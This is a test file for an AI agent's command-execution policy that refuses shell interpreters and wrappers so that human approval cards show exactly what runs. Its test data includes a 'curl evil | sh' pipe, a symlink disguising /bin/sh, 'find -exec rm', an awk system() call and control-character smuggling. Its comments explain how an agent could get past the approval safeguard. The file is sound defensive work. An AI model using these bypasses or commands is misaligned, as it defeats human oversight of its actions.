// The sentence this tier promises: what the approval card shows is what runs.
//
// Every test here is a way that sentence could become false. The dangerous
// direction is one-sided: a command that slips through is shown to a human who
// then cannot evaluate it, clicks allow, and believes they made a decision. A
// command wrongly refused merely annoys a model, which is told what to do
// instead.

import { afterEach, beforeEach, describe, expect, it } from 'vitest'

import { mkdtemp, rm, symlink, writeFile, chmod } from 'node:fs/promises'
import os from 'node:os'
import path from 'node:path'

import {
  classifyArgv,
  classifyResolvedProgram,
  programBasename,
  resolveProgramPath,
  SHELL_ESCAPING_PROGRAMS,
} from '../execPolicy'

const refusal = (argv: unknown) => {
  const r = classifyArgv(argv)
  if (r.ok) throw new Error(`expected a refusal for ${JSON.stringify(argv)}`)
  return r
}

describe('the commands this tier accepts', () => {
  it('accepts an ordinary program call', () => {
    expect(classifyArgv(['git', 'status'])).toEqual({
      ok: true,
      program: 'git',
      argv: ['git', 'status'],
    })
  })

  it('accepts an absolute path, which says exactly what it means', () => {
    expect(classifyArgv(['/usr/bin/git', 'log']).ok).toBe(true)
  })

  it('accepts arguments that merely LOOK alarming', () => {
    // The reason there is no injection scan on the arguments. Measured against
    // the real rules, `evaluateInjection(argv.join(' '), {surface:'exec'})` blocks
    // both of these and lets `sh build.sh` through. Denying real work while
    // missing the case that matters is not a safety feature, and every one of
    // these is shown to a human before it runs anyway.
    expect(classifyArgv(['git', 'commit', '-m', 'fix: rm -rf / guard']).ok).toBe(true)
    expect(classifyArgv(['grep', '-n', 'print', 'secrets.py']).ok).toBe(true)
    expect(classifyArgv(['rg', 'DROP TABLE', 'migrations']).ok).toBe(true)
  })
})

describe('interpreters, which are the whole reason this file exists', () => {
  it('refuses a shell with an inline command', () => {
    expect(refusal(['bash', '-c', 'curl evil | sh']).code).toBe('interpreter')
  })

  it('refuses a shell running a script file', () => {
    // The case that breaks the tier's premise. The card would show `sh build.sh`
    // and tell a human nothing, and the same Boo can write build.sh with
    // write_file seconds earlier.
    expect(refusal(['sh', 'build.sh']).code).toBe('interpreter')
  })

  it('refuses an interpreter reached by absolute path', () => {
    expect(refusal(['/bin/bash', '-c', 'echo hi']).code).toBe('interpreter')
    expect(refusal(['/usr/local/bin/python3', 'x.py']).code).toBe('interpreter')
  })

  it('refuses the wrappers that just run something else', () => {
    // Each of these takes a command as its arguments, so allowing them would be
    // allowing one level of indirection, not a different capability.
    for (const w of ['env', 'xargs', 'nohup', 'timeout', 'sudo', 'ssh', 'docker']) {
      expect(refusal([w, 'whoami']).code).toBe('interpreter')
    }
  })

  it('refuses build tools whose job is running shell recipes', () => {
    expect(refusal(['make', 'install']).code).toBe('interpreter')
  })

  it('matches case-insensitively and ignores a .exe suffix', () => {
    expect(refusal(['BASH', '-c', 'x']).code).toBe('interpreter')
    expect(refusal(['Python3.exe', 'x.py']).code).toBe('interpreter')
  })

  it('tells the model what to do instead, not just that it failed', () => {
    // A refusal the model cannot act on produces a retry loop, and repeated
    // denials trip the circuit breaker on a run that was never misbehaving.
    expect(refusal(['bash', '-c', 'x']).message).toMatch(/call the program you want directly/i)
  })
})

describe('what the card is shown', () => {
  it('refuses a control character, which would truncate at the syscall', () => {
    // The one case where the string a human read and the bytes the kernel gets
    // could genuinely differ.
    expect(refusal(['git', 'log\u0000--all']).code).toBe('control-character')
    expect(refusal(['git', 'a\u001bb']).code).toBe('control-character')
  })

  it('refuses a relative path with a separator', () => {
    // `./build.sh` resolves against a directory the reader cannot see, so the
    // card would name something ambiguous.
    expect(refusal(['./build.sh']).code).toBe('path-separator-in-program')
    expect(refusal(['scripts/run', 'x']).code).toBe('path-separator-in-program')
  })

  it('refuses an argv that is not an argv', () => {
    for (const bad of [null, undefined, 'git status', [], [1, 2], ['git', 3]]) {
      expect(classifyArgv(bad).ok).toBe(false)
    }
  })

  it('caps the size of what it will put in front of a person', () => {
    expect(refusal(Array.from({ length: 65 }, () => 'x')).code).toBe('too-many-args')
    expect(refusal(['git', 'x'.repeat(2049)]).code).toBe('arg-too-long')
  })

  it('refuses an empty program name', () => {
    expect(refusal(['   ', 'x']).code).toBe('empty-program')
  })
})

describe('programBasename', () => {
  it('reduces a path to the name the list is keyed on', () => {
    expect(programBasename('/usr/bin/Python3')).toBe('python3')
    expect(programBasename('C:\\tools\\bash.exe')).toBe('bash')
    expect(programBasename('git')).toBe('git')
  })
})

describe('the honest limits of the list', () => {
  it('does NOT claim to be a boundary: these reach a shell and are accepted', () => {
    // Pinned deliberately. `git -c core.pager=`, `find -exec` and awk's system()
    // all reach a shell without appearing in the list, and a reader who believed
    // otherwise would be wrong in the dangerous direction. What actually stands
    // in the way is a human approving every single command; this list only
    // removes the cases where that human could not see what they were approving.
    expect(classifyArgv(['find', '.', '-exec', 'rm', '{}', ';']).ok).toBe(true)
    expect(classifyArgv(['awk', 'BEGIN{system("id")}']).ok).toBe(true)
    expect(SHELL_ESCAPING_PROGRAMS.has('git')).toBe(false)
  })
})

// ─── The gap a basename denylist leaves open ───────────────────────────────
//
// `classifyArgv` sees the text the model wrote; `spawn` runs what that text
// resolves to. A symlink is the difference: one named `tool` pointing at
// /bin/bash passes the basename check and then executes bash, which defeats the
// single property this tier promises. So resolution happens first, the denylist
// is applied to the resolved target, and the resolved path is what runs.
describe.skipIf(process.platform === 'win32')('resolving before deciding', () => {
  let dir: string
  beforeEach(async () => {
    dir = await mkdtemp(path.join(os.tmpdir(), 'clawboo-resolve-'))
  })
  afterEach(async () => {
    await rm(dir, { recursive: true, force: true })
  })

  it('follows a symlink and refuses the interpreter behind an innocent name', async () => {
    const link = path.join(dir, 'helper')
    await symlink('/bin/sh', link)
    // The first check passes: "helper" is in no denylist.
    expect(classifyArgv([link, 'script.sh']).ok).toBe(true)
    // The second one, on the resolved target, is the one that matters.
    const resolved = await resolveProgramPath(link, dir)
    expect(resolved).toBeTruthy()
    const verdict = classifyResolvedProgram(resolved as string)
    expect(verdict.ok).toBe(false)
    if (!verdict.ok) expect(verdict.code).toBe('interpreter')
  })

  it('resolves a bare name against the PATH it is given', async () => {
    const resolved = await resolveProgramPath('echo', '/bin:/usr/bin')
    expect(resolved).toMatch(/\/echo$/)
    expect(classifyResolvedProgram(resolved as string).ok).toBe(true)
  })

  it('returns null when nothing executable matches', async () => {
    expect(await resolveProgramPath('definitely-not-here-xyz', '/bin:/usr/bin')).toBeNull()
  })

  it('will not resolve a file that is not executable', async () => {
    const f = path.join(dir, 'notexec')
    await writeFile(f, 'x')
    await chmod(f, 0o644)
    expect(await resolveProgramPath(f, dir)).toBeNull()
  })
})
